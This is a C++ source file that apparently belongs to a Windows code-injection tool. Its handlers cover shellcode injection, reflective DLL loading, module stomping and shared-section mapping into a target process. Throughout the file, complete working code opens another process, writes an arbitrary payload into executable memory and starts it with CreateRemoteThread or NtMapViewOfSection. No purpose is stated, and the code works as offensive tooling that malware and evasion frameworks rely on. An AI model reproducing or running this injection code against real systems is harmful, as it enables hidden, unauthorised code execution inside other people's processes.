#include "handler_payloads.h"
#include "payload_utils.h"
#include "process_utils.h"

#include <algorithm>
#include <cctype>
#include <cstring>
#include <optional>
#include <string>
#include <vector>

#ifndef _WIN32
dispatch_outcome handle_manual_map(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_shellcode(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_reflective_dll(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_module_stomping(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_shared_section_map(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

#else
#include <tlhelp32.h>

namespace
{
    const char* resolve_payload_path(const rw_injection_request* req, const parsed_params& params)
    {
        if (const auto override_path = params.get_string("payloadPath"))
        {
            return override_path->c_str();
        }
        return req ? req->payload_path : nullptr;
    }

    void* alloc_target_memory(HANDLE process, size_t size, DWORD protect, bool is_self)
    {
        if (is_self)
        {
            return ::VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, protect);
        }

        return ::VirtualAllocEx(process, nullptr, size, MEM_COMMIT | MEM_RESERVE, protect);
    }

    void free_target_memory(HANDLE process, void* address, bool is_self)
    {
        if (!address)
        {
            return;
        }

        if (is_self)
        {
            ::VirtualFree(address, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, address, 0, MEM_RELEASE);
        }
    }

    bool write_target_memory(HANDLE process, void* destination, const void* source, size_t size, bool is_self)
    {
        if (!destination || !source)
        {
            return false;
        }

        if (is_self)
        {
            std::memcpy(destination, source, size);
            return true;
        }

        return ::WriteProcessMemory(process, destination, source, size, nullptr) != 0;
    }

    bool parse_entry_offset(const parsed_params& params, size_t payload_size, size_t& entry_offset, dispatch_outcome& failure)
    {
        entry_offset = 0;
        if (const auto offset_value = params.get_int("entryOffset"))
        {
            if (*offset_value < 0)
            {
                failure = { false, "TECHNIQUE_PARAM_INVALID", "entryOffset must be zero or greater." };
                return false;
            }

            size_t offset = static_cast<size_t>(*offset_value);
            if (offset >= payload_size)
            {
                failure = { false, "TECHNIQUE_PARAM_INVALID", "entryOffset must be within payload bounds." };
                return false;
            }

            entry_offset = offset;
        }

        return true;
    }

    struct pe_view
    {
        const unsigned char* base;
        size_t size;
        const IMAGE_SECTION_HEADER* sections;
        size_t section_count;
        const IMAGE_DATA_DIRECTORY* data_directories;
    };

    bool build_pe_view(const std::vector<unsigned char>& image, pe_view& view)
    {
        view = {};
        if (image.size() < sizeof(IMAGE_DOS_HEADER))
        {
            return false;
        }

        const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        {
            return false;
        }

        if (dos->e_lfanew <= 0)
        {
            return false;
        }

        size_t nt_offset = static_cast<size_t>(dos->e_lfanew);
        if (nt_offset + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) > image.size())
        {
            return false;
        }

        const auto* file_header = reinterpret_cast<const IMAGE_FILE_HEADER*>(image.data() + nt_offset + sizeof(DWORD));
        const unsigned char* optional_header = image.data() + nt_offset + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);

        if (nt_offset + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + file_header->SizeOfOptionalHeader > image.size())
        {
            return false;
        }

        if (file_header->SizeOfOptionalHeader < sizeof(WORD))
        {
            return false;
        }

        WORD magic = *reinterpret_cast<const WORD*>(optional_header);
        const IMAGE_DATA_DIRECTORY* data_directories = nullptr;
        if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        {
            const auto* opt32 = reinterpret_cast<const IMAGE_OPTIONAL_HEADER32*>(optional_header);
            data_directories = opt32->DataDirectory;
        }
        else if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        {
            const auto* opt64 = reinterpret_cast<const IMAGE_OPTIONAL_HEADER64*>(optional_header);
            data_directories = opt64->DataDirectory;
        }
        else
        {
            return false;
        }

        size_t section_offset = nt_offset + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + file_header->SizeOfOptionalHeader;
        size_t section_count = file_header->NumberOfSections;
        size_t section_bytes = section_count * sizeof(IMAGE_SECTION_HEADER);

        if (section_offset + section_bytes > image.size())
        {
            return false;
        }

        view.base = image.data();
        view.size = image.size();
        view.sections = reinterpret_cast<const IMAGE_SECTION_HEADER*>(image.data() + section_offset);
        view.section_count = section_count;
        view.data_directories = data_directories;
        return true;
    }

    bool rva_to_offset(const pe_view& view, uint32_t rva, uint32_t& out_offset)
    {
        for (size_t i = 0; i < view.section_count; ++i)
        {
            const IMAGE_SECTION_HEADER& section = view.sections[i];
            uint32_t size = std::max(section.Misc.VirtualSize, section.SizeOfRawData);
            if (rva >= section.VirtualAddress && rva < section.VirtualAddress + size)
            {
                out_offset = section.PointerToRawData + (rva - section.VirtualAddress);
                return out_offset < view.size;
            }
        }

        return false;
    }

    bool find_export_offset(const std::vector<unsigned char>& image, const std::string& export_name, uint32_t& out_offset)
    {
        pe_view view{};
        if (!build_pe_view(image, view))
        {
            return false;
        }

        const IMAGE_DATA_DIRECTORY& export_dir = view.data_directories[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (export_dir.VirtualAddress == 0 || export_dir.Size == 0)
        {
            return false;
        }

        uint32_t export_offset = 0;
        if (!rva_to_offset(view, export_dir.VirtualAddress, export_offset))
        {
            return false;
        }

        if (export_offset + sizeof(IMAGE_EXPORT_DIRECTORY) > view.size)
        {
            return false;
        }

        const auto* export_table = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(view.base + export_offset);

        uint32_t names_offset = 0;
        uint32_t ordinals_offset = 0;
        uint32_t functions_offset = 0;
        if (!rva_to_offset(view, export_table->AddressOfNames, names_offset) ||
            !rva_to_offset(view, export_table->AddressOfNameOrdinals, ordinals_offset) ||
            !rva_to_offset(view, export_table->AddressOfFunctions, functions_offset))
        {
            return false;
        }

        if (names_offset >= view.size || ordinals_offset >= view.size || functions_offset >= view.size)
        {
            return false;
        }

        const auto* name_rvas = reinterpret_cast<const uint32_t*>(view.base + names_offset);
        const auto* ordinals = reinterpret_cast<const uint16_t*>(view.base + ordinals_offset);
        const auto* functions = reinterpret_cast<const uint32_t*>(view.base + functions_offset);

        for (uint32_t i = 0; i < export_table->NumberOfNames; ++i)
        {
            uint32_t name_rva = name_rvas[i];
            uint32_t name_offset = 0;
            if (!rva_to_offset(view, name_rva, name_offset))
            {
                continue;
            }

            if (name_offset >= view.size)
            {
                continue;
            }

            const char* name_ptr = reinterpret_cast<const char*>(view.base + name_offset);
            if (export_name == name_ptr)
            {
                uint16_t ordinal_index = ordinals[i];
                if (ordinal_index >= export_table->NumberOfFunctions)
                {
                    return false;
                }

                uint32_t function_rva = functions[ordinal_index];
                uint32_t function_offset = 0;
                if (!rva_to_offset(view, function_rva, function_offset))
                {
                    return false;
                }

                out_offset = function_offset;
                return out_offset < view.size;
            }
        }

        return false;
    }

    std::string to_lower(std::string value)
    {
        std::transform(value.begin(), value.end(), value.begin(), [](unsigned char ch)
        {
            return static_cast<char>(std::tolower(ch));
        });
        return value;
    }

    std::string normalize_module_name(std::string value)
    {
        value = to_lower(value);
        if (value.size() > 4)
        {
            const std::string suffix = value.substr(value.size() - 4);
            if (suffix == ".dll" || suffix == ".exe")
            {
                value.resize(value.size() - 4);
            }
        }
        return value;
    }

    bool ends_with(const std::string& value, const std::string& suffix)
    {
        if (suffix.size() > value.size())
        {
            return false;
        }
        return std::equal(suffix.rbegin(), suffix.rend(), value.rbegin());
    }

#ifdef UNICODE
    std::string to_utf8(const wchar_t* value)
    {
        if (!value || value[0] == L'\0')
        {
            return {};
        }

        int needed = ::WideCharToMultiByte(CP_UTF8, 0, value, -1, nullptr, 0, nullptr, nullptr);
        if (needed <= 1)
        {
            return {};
        }

        std::string result(static_cast<size_t>(needed - 1), '\0');
        ::WideCharToMultiByte(CP_UTF8, 0, value, -1, result.data(), needed, nullptr, nullptr);
        return result;
    }
#else
    std::string to_utf8(const char* value)
    {
        return value ? std::string(value) : std::string();
    }
#endif

    bool find_module_entry(DWORD pid, const std::optional<std::string>& module_name, MODULEENTRY32& out_entry)
    {
        HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if (snapshot == INVALID_HANDLE_VALUE)
        {
            return false;
        }

        MODULEENTRY32 entry{};
        entry.dwSize = sizeof(entry);
        if (!::Module32First(snapshot, &entry))
        {
            ::CloseHandle(snapshot);
            return false;
        }

        if (!module_name.has_value())
        {
            out_entry = entry;
            ::CloseHandle(snapshot);
            return true;
        }

        std::string target = normalize_module_name(*module_name);

        do
        {
            std::string name = to_utf8(entry.szModule);
            std::string path = to_utf8(entry.szExePath);

            std::string normalized_name = normalize_module_name(name);
            if (normalized_name == target)
            {
                out_entry = entry;
                ::CloseHandle(snapshot);
                return true;
            }

            std::string normalized_path = normalize_module_name(path);
            if (!normalized_path.empty() && ends_with(normalized_path, target))
            {
                out_entry = entry;
                ::CloseHandle(snapshot);
                return true;
            }
        } while (::Module32Next(snapshot, &entry));

        ::CloseHandle(snapshot);
        return false;
    }

    using NtMapViewOfSection_t = LONG (NTAPI*)(
        HANDLE section_handle,
        HANDLE process_handle,
        PVOID* base_address,
        ULONG_PTR zero_bits,
        SIZE_T commit_size,
        PLARGE_INTEGER section_offset,
        PSIZE_T view_size,
        DWORD inherit_disposition,
        ULONG allocation_type,
        ULONG win32_protect);

    using NtUnmapViewOfSection_t = LONG (NTAPI*)(HANDLE process_handle, PVOID base_address);

    NtMapViewOfSection_t resolve_nt_map_view_of_section()
    {
        HMODULE ntdll = ::GetModuleHandleA("ntdll.dll");
        if (!ntdll)
        {
            return nullptr;
        }

        return reinterpret_cast<NtMapViewOfSection_t>(::GetProcAddress(ntdll, "NtMapViewOfSection"));
    }

    NtUnmapViewOfSection_t resolve_nt_unmap_view_of_section()
    {
        HMODULE ntdll = ::GetModuleHandleA("ntdll.dll");
        if (!ntdll)
        {
            return nullptr;
        }

        return reinterpret_cast<NtUnmapViewOfSection_t>(::GetProcAddress(ntdll, "NtUnmapViewOfSection"));
    }

    dispatch_outcome run_reflective_load(const rw_injection_request* req, const parsed_params& params, const char* export_param, const char* default_export)
    {
        dispatch_outcome failure{};
        HANDLE process = open_process_for_injection(req,
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            failure);
        if (!process)
        {
            return failure;
        }

        const char* payload_path = resolve_payload_path(req, params);
        if (!payload_path || payload_path[0] == '\0')
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_PATH_REQUIRED", "Payload path is required." };
        }

        if (!payload_exists(payload_path))
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_NOT_FOUND", "Payload was not found." };
        }

        std::vector<unsigned char> payload;
        if (!read_payload_file(payload_path, payload))
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_READ_FAILED", "Failed to read payload file." };
        }

        std::string export_name = default_export;
        if (const auto override_name = params.get_string(export_param))
        {
            if (override_name->empty())
            {
                if (process != ::GetCurrentProcess())
                {
                    ::CloseHandle(process);
                }
                return { false, "TECHNIQUE_PARAM_INVALID", "Export name must be non-empty." };
            }
            export_name = *override_name;
        }

        uint32_t export_offset = 0;
        if (!find_export_offset(payload, export_name, export_offset))
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "REFLECTIVE_EXPORT_NOT_FOUND", "Reflective loader export was not found." };
        }

        bool is_self = process == ::GetCurrentProcess();
        void* remote_base = alloc_target_memory(process, payload.size(), PAGE_EXECUTE_READWRITE, is_self);
        if (!remote_base)
        {
            if (!is_self)
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for payload." };
        }

        if (!write_target_memory(process, remote_base, payload.data(), payload.size(), is_self))
        {
            free_target_memory(process, remote_base, is_self);
            if (!is_self)
            {
                ::CloseHandle(process);
            }
            return { false, "PAYLOAD_WRITE_FAILED", "Failed to write payload to target process." };
        }

        ::FlushInstructionCache(process, remote_base, payload.size());

        auto start_address = reinterpret_cast<unsigned char*>(remote_base) + export_offset;

        HANDLE thread = nullptr;
        if (is_self)
        {
            thread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), remote_base, 0, nullptr);
        }
        else
        {
            thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), remote_base, 0, nullptr);
        }

        if (!thread)
        {
            free_target_memory(process, remote_base, is_self);
            if (!is_self)
            {
                ::CloseHandle(process);
            }
            return { false, "THREAD_CREATE_FAILED", "Failed to start reflective loader thread." };
        }

        ::WaitForSingleObject(thread, INFINITE);
        ::CloseHandle(thread);

        if (!is_self)
        {
            ::CloseHandle(process);
        }

        return { true, nullptr, nullptr };
    }

}

dispatch_outcome handle_manual_map(const rw_injection_request* req, const parsed_params& params)
{
    return run_reflective_load(req, params, "entryPoint", "ReflectiveLoader");
}

dispatch_outcome handle_shellcode(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "Shellcode payload was not found." };
    }

    std::vector<unsigned char> payload;
    if (!read_payload_file(payload_path, payload))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_READ_FAILED", "Failed to read shellcode payload." };
    }

    LPVOID remote_buffer = nullptr;
    SIZE_T payload_size = payload.size();
    size_t entry_offset = 0;
    if (!parse_entry_offset(params, payload_size, entry_offset, failure))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return failure;
    }
    if (process == ::GetCurrentProcess())
    {
        remote_buffer = ::VirtualAlloc(nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    else
    {
        remote_buffer = ::VirtualAllocEx(process, nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_buffer)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for shellcode." };
    }

    BOOL write_ok = FALSE;
    if (process == ::GetCurrentProcess())
    {
        std::memcpy(remote_buffer, payload.data(), payload_size);
        write_ok = TRUE;
    }
    else
    {
        write_ok = ::WriteProcessMemory(process, remote_buffer, payload.data(), payload_size, nullptr);
    }

    if (!write_ok)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        }
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write shellcode to target process." };
    }

    ::FlushInstructionCache(process, remote_buffer, payload_size);

    auto start_address = reinterpret_cast<unsigned char*>(remote_buffer) + entry_offset;
    HANDLE thread = nullptr;
    if (process == ::GetCurrentProcess())
    {
        thread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), nullptr, 0, nullptr);
    }
    else
    {
        thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), nullptr, 0, nullptr);
    }

    if (!thread)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        }
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "THREAD_CREATE_FAILED", "Failed to start shellcode thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    ::CloseHandle(thread);

    if (process == ::GetCurrentProcess())
    {
        ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
    }
    else
    {
        ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        ::CloseHandle(process);
    }

    return { true, nullptr, nullptr };
}

dispatch_outcome handle_reflective_dll(const rw_injection_request* req, const parsed_params& params)
{
    return run_reflective_load(req, params, "exportName", "ReflectiveLoader");
}

dispatch_outcome handle_module_stomping(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_path || payload_path[0] == '\0')
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_PATH_REQUIRED", "Payload path is required." };
    }

    if (!payload_exists(payload_path))
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_NOT_FOUND", "ModuleStomping payload was not found." };
    }

    std::vector<unsigned char> payload;
    if (!read_payload_file(payload_path, payload))
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_READ_FAILED", "Failed to read module stomping payload." };
    }

    if (process == ::GetCurrentProcess())
    {
        return { false, "TARGET_SELF_UNSUPPORTED", "ModuleStomping is not supported against the current process." };
    }

    std::optional<std::string> module_name;
    if (const auto name = params.get_string("moduleName"))
    {
        if (name->empty())
        {
            ::CloseHandle(process);
            return { false, "TECHNIQUE_PARAM_INVALID", "moduleName must be non-empty." };
        }
        module_name = *name;
    }

    MODULEENTRY32 module{};
    DWORD pid = ::GetProcessId(process);
    if (!find_module_entry(pid, module_name, module))
    {
        ::CloseHandle(process);
        return { false, "MODULE_NOT_FOUND", "Target module was not found." };
    }

    if (payload.size() > module.modBaseSize)
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_TOO_LARGE", "Payload is larger than target module." };
    }

    size_t entry_offset = 0;
    if (!parse_entry_offset(params, payload.size(), entry_offset, failure))
    {
        ::CloseHandle(process);
        return failure;
    }

    DWORD old_protect = 0;
    if (!::VirtualProtectEx(process, module.modBaseAddr, payload.size(), PAGE_EXECUTE_READWRITE, &old_protect))
    {
        ::CloseHandle(process);
        return { false, "PAYLOAD_PROTECT_FAILED", "Failed to change module memory protection." };
    }

    if (!::WriteProcessMemory(process, module.modBaseAddr, payload.data(), payload.size(), nullptr))
    {
        DWORD ignored = 0;
        ::VirtualProtectEx(process, module.modBaseAddr, payload.size(), old_protect, &ignored);
        ::CloseHandle(process);
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to stomp module memory." };
    }

    ::FlushInstructionCache(process, module.modBaseAddr, payload.size());

    DWORD ignored = 0;
    ::VirtualProtectEx(process, module.modBaseAddr, payload.size(), old_protect, &ignored);

    auto start_address = reinterpret_cast<unsigned char*>(module.modBaseAddr) + entry_offset;
    HANDLE thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), nullptr, 0, nullptr);
    if (!thread)
    {
        ::CloseHandle(process);
        return { false, "THREAD_CREATE_FAILED", "Failed to start module stomping thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    ::CloseHandle(thread);
    ::CloseHandle(process);
    return { true, nullptr, nullptr };
}

dispatch_outcome handle_shared_section_map(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_path || payload_path[0] == '\0')
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_PATH_REQUIRED", "Payload path is required." };
    }

    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "Shared section payload was not found." };
    }

    std::vector<unsigned char> payload;
    if (!read_payload_file(payload_path, payload))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_READ_FAILED", "Failed to read shared section payload." };
    }

    std::optional<std::string> section_name;
    if (const auto name = params.get_string("sectionName"))
    {
        if (name->empty())
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "TECHNIQUE_PARAM_INVALID", "sectionName must be non-empty." };
        }
        section_name = *name;
    }

    size_t payload_size = payload.size();
    DWORD size_high = static_cast<DWORD>((payload_size >> 32) & 0xFFFFFFFF);
    DWORD size_low = static_cast<DWORD>(payload_size & 0xFFFFFFFF);
    HANDLE mapping = ::CreateFileMappingA(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, size_high, size_low,
        section_name ? section_name->c_str() : nullptr);
    if (!mapping)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "SECTION_CREATE_FAILED", "Failed to create shared section." };
    }

    void* local_view = ::MapViewOfFile(mapping, FILE_MAP_READ | FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, payload_size);
    if (!local_view)
    {
        ::CloseHandle(mapping);
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "SECTION_MAP_FAILED", "Failed to map shared section locally." };
    }

    std::memcpy(local_view, payload.data(), payload_size);

    bool is_self = process == ::GetCurrentProcess();
    void* remote_view = local_view;
    NtMapViewOfSection_t map_view = nullptr;
    NtUnmapViewOfSection_t unmap_view = nullptr;

    if (!is_self)
    {
        map_view = resolve_nt_map_view_of_section();
        unmap_view = resolve_nt_unmap_view_of_section();
        if (!map_view)
        {
            ::UnmapViewOfFile(local_view);
            ::CloseHandle(mapping);
            ::CloseHandle(process);
            return { false, "SECTION_MAP_FAILED", "NtMapViewOfSection could not be resolved." };
        }

        SIZE_T view_size = payload_size;
        PVOID base_address = nullptr;
        LONG status = map_view(mapping, process, &base_address, 0, 0, nullptr, &view_size, 1, 0, PAGE_EXECUTE_READWRITE);
        if (status != 0 || !base_address)
        {
            ::UnmapViewOfFile(local_view);
            ::CloseHandle(mapping);
            ::CloseHandle(process);
            return { false, "SECTION_MAP_FAILED", "Failed to map shared section into target process." };
        }

        remote_view = base_address;
    }

    HANDLE thread = nullptr;
    if (is_self)
    {
        thread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_view), nullptr, 0, nullptr);
    }
    else
    {
        thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_view), nullptr, 0, nullptr);
    }

    if (!thread)
    {
        if (!is_self && unmap_view && remote_view)
        {
            unmap_view(process, remote_view);
        }
        ::UnmapViewOfFile(local_view);
        ::CloseHandle(mapping);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "THREAD_CREATE_FAILED", "Failed to start shared section thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    ::CloseHandle(thread);

    if (!is_self && unmap_view && remote_view)
    {
        unmap_view(process, remote_view);
    }

    ::UnmapViewOfFile(local_view);
    ::CloseHandle(mapping);

    if (!is_self)
    {
        ::CloseHandle(process);
    }

    return { true, nullptr, nullptr };
}
#endif
